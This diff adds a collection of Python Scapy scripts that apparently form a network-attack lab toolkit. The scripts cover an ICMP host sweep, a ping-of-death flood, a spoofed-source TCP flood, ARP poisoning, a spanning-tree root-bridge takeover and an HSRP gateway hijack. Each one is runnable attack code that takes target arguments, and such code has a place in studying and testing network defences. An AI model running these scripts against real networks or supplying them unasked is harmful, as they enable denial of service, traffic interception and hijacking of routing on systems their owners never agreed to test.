@@ -1,0 +1,278 @@
+######### icmp_discovery.py #########
+
+from scapy.all import *
+import logging
+
+# Pre-definitions
+src_spoofed = "200.1.1.14"
+dest_network = "200.1.1."
+hosts = []
+
+# Suppress Warning Output
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+# Loop Through Network to Identify Hosts.
+print("Available Hosts\n--------------------------------------")
+for i in range(1,255):
+  dest_host = dest_network + str(i)
+  
+  # ICMP Ping to find active hosts
+  message = sr1(IP(dst=dest_host)/ICMP(), timeout=1, verbose=0)
+  
+  if message:
+    print("Host: " + message.src)
+    hosts.append(message.src)
+    
+sys.exit(0)
+
+#############################################
+
+######### ping_DoS.py #########
+
+from scapy.all import *
+from argparse import ArgumentParser
+import socket
+
+# Specify Command Line Arguments
+parser = ArgumentParser()
+parser.add_argument('--target-ip', '-t', help='Target IP address')
+parser.epilog = "Usage: python ping_DoS.py -t <IP Address>"        
+args = parser.parse_args()
+
+try:
+  socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
+  
+  if args.target_ip is not None: # Checks if argument is not empty
+
+    target_ip = args.target_ip 
+    
+    ip = IP(src=RandIP(), dst=target_ip) # Randomize Source IP, specify destination target's IP
+    message = '@' # Sends a malicious packet of large size.
+    
+    #send(fragment(IP(src=RandIP(),dst=target_ip)/ICMP()/(message*60000)))
+    send(fragment(ip/ICMP()/(message*60000)))
+   
+except:
+  parser.print_help()
+  #print('[-]Please, use --target-ip or -t to set a Target IP Address!')
+  #print('[!]Example: -t 10.20.30.40')
+  #print('[?] -h for help')
+  sys.exit(1)
+  
+sys.exit(0)
+
+
+#############################################
+
+######### tcp_flooding.py #########
+
+from scapy.all import *
+from argparse import ArgumentParser
+import socket
+
+
+def main():
+    
+    # Specify the command line Arguments
+    parser = ArgumentParser()
+    parser.add_argument('--target-ip', '-t', help='Target IP address')
+    parser.add_argument('--target-port', '-p', help='Target Port')
+    parser.add_argument('--tcp-flag', '-f', help='TCP Flag')
+    parser.epilog = "Usage: python tcp_flooding.py -t <IP Address> -p <Target Port> -f <TCP Flags>"         
+    args = parser.parse_args()
+    
+
+    try:
+        socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
+        
+    except:    
+        parser.print_help()
+        sys.exit(1)
+    
+    # Checks if argument is not empty
+    if args.target_ip is not None and args.target_port is not None and args.tcp_flag is not None:
+        target_ip = args.target_ip # target IP address (should be a testing router/firewall)
+
+        target_port = int(args.target_port) # the target port u want to flood
+
+        tcp_flag = args.tcp_flag # TCP Flag to flood
+
+        ip = IP(src=RandIP(), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
+
+        tcp = TCP(sport=RandShort(), dport=target_port, flags=tcp_flag) # random source port, use TCP SYN packet.
+
+        raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
+
+        p = ip / tcp / raw # stack up the layers
+
+        send(p, count=1, verbose=0) # send 1 packet to test if target ip is valid
+
+        print("The Flood has commence, do CTRL+C to cancel / exit")
+
+        send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
+
+    else:
+        parser.print_help()
+        sys.exit(1)
+        
+
+main()
+sys.exit(0)
+
+
+#############################################
+
+######### arp_poisoning.py #########
+
+from argparse import ArgumentParser
+from scapy.all import *
+import random
+#import re
+
+def main():
+    parser = ArgumentParser()
+    parser.add_argument('--target-ip', '-ti', help='Target IP address')
+    parser.add_argument('--target-mac', '-tm', help='Target MAC address')
+    parser.add_argument('--fake-ip', '-fi', help='Fake / Spoofed IP address')
+    parser.add_argument('--fake-mac', '-fm', help='Fake / Spoofed MAC address')
+    parser.add_argument('--count', '-c', help='Number of packets')
+    parser.add_argument('--version','-v', action='version', version='ARP_Poisoning_CMD v1.1')
+    parser.epilog = "Usage: python arp_poisoning.py -ti <target_ip> -tm <target_mac> -fi <fake_ip> -fm <fake_mac> -c <count>"
+
+    args = parser.parse_args()
+    
+    #pattern = re.compile("([0-9a-fA-F]{2}[:]){5}([0-9a-fA-F]{2})")
+
+    # Checks for any missing arguments
+    if args.target_ip is None or args.target_mac is None or args.fake_ip is None or args.fake_mac is None:
+        # print('[-]Please, use --fake-mac or -fm to set a fake MAC address!')
+        # print('[!]Example: -fm aa:bb:cc:11:22:33')
+        # print('[?] -h for help')
+        parser.print_help()
+        sys.exit(1)
+    
+    else:
+        arpPacket = ARP()   # Initialise ARP Packet
+        icmpPacket = IP()   # Initialise ICMP Packet
+        
+        # Setting Destination IPs (using Target IP)
+        arpPacket.pdst = args.target_ip
+        icmpPacket.dst = args.target_ip
+        
+        # Setting Destination Hardware / Physical Address (with Target's)
+        arpPacket.hwdst = args.target_mac
+        
+        # Setting (Spoofed) Source IPs
+        arpPacket.psrc = args.fake_ip
+        icmpPacket.src = args.fake_ip
+        
+        # Setting (Spoofed) Source MAC Address 
+        arpPacket.hwsrc = args.fake_mac
+
+        # If Counter parameter (-c <amount>) was not set, only send packet once
+        if args.count is None:
+                print('[!]Counter parameter not set, sending 1 packet only..')
+                send(icmpPacket)
+                send(arpPacket)
+        
+        # Else, do a FOR Loop based on the amount specified
+        else:
+            for i in range(int(args.count)):
+                send(icmpPacket)
+                send(arpPacket)
+
+main()
+sys.exit(0)
+
+
+#############################################
+
+######### stp_root_attack.py #########
+
+from scapy.all import *
+import time
+from argparse import ArgumentParser
+
+
+def main():
+    
+    # Defining the arguments
+    parser = ArgumentParser()
+    parser.add_argument('--rogue-mac', '-r', help='Rogue MAC Address')
+    parser.add_argument('--count', '-c', help='Count of frames to send')
+    parser.epilog = "Usage: python stp_root_attack.py -r 00:00:00:00:00:01 -c 50"
+    
+    args = parser.parse_args()
+    
+    #print(args)
+    
+    if args.rogue_mac is not None:
+        
+        # Capture the STP frame
+        packet = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)   # STP uses this well known MAC Address 
+        print("*************** Original Packet ***************")
+        packet[0].show()
+        
+        # Modify the STP frame to be malicious
+        packet[0].src = args.rogue_mac
+        packet[0].rootid = 0                    # Specify a low Root ID (highest priority)
+        packet[0].rootmac = args.rogue_mac
+        packet[0].bridgeid = 0                  # Specify a low Root ID (highest priority)
+        packet[0].bridgemac = args.rogue_mac
+        print("--------------- Modified Packet ---------------")
+        packet[0].show()
+        
+        # Loop to continuously send the frame, ensuring the root switch isn't taken over:                
+        # Defining the amount of times to send the malicious STP frame
+        print("Transmitting malicious STP frames now")
+        
+        count = 0
+        
+        if args.count is not None:
+            count = int(args.count)
+            for i in range(0, count):
+                sendp(packet[0], loop=0, verbose=1)
+                time.sleep(1)
+        else:
+            sendp(packet[0], loop=1, verbose=1)
+    
+        sys.exit(0)
+        
+    else:
+        parser.print_help()
+        sys.exit(1)
+        
+main()
+
+
+#############################################
+
+######### hsrp.py #########
+
+from scapy.all import *
+from argparse import ArgumentParser
+
+# Defining the arguments
+parser=ArgumentParser()
+parser.add_argument('--src','-src', help='Source IP Address')
+parser.add_argument('--group','-grp', help='HSRP Group No.')
+parser.add_argument('--virtualIP','-vip', help='Virtual IP Address')
+parser.add_argument('--iface','-int', help='Interface')
+parser.epilog="Usage: sudo python3 hsrp.py -src 10.0.0.10 -grp 1 -vip 10.0.0.1 -int eth0"
+
+args=parser.parse_args()
+
+# Check the validity of arguments
+if args.src is not None and args.group is not None and args.virtualIP is not None and args.iface is not None:
+   ip = IP(src=args.src, dst='224.0.0.2')       # Modifies the IP header, with destination to the well-known HSRP IP address
+   udp = UDP(sport=1985,dport=1985)             # Modifies the UDP port to HSRP's port
+   hsrp = HSRP(group=int(args.group),priority=255,virtualIP=args.virtualIP)   # Modifies a HSRP header according to specified arguments
+      
+   print("HSRP Attack is in progress, do CTRL+C to cancel / exit")
+   send(ip/udp/hsrp, iface=args.iface, inter=3, loop=1)  # Send the packet with all the modified headers, and loop.
+
+   sys.exit(0) 
+   
+else:
+   parser.print_help()
+   sys.exit(1)
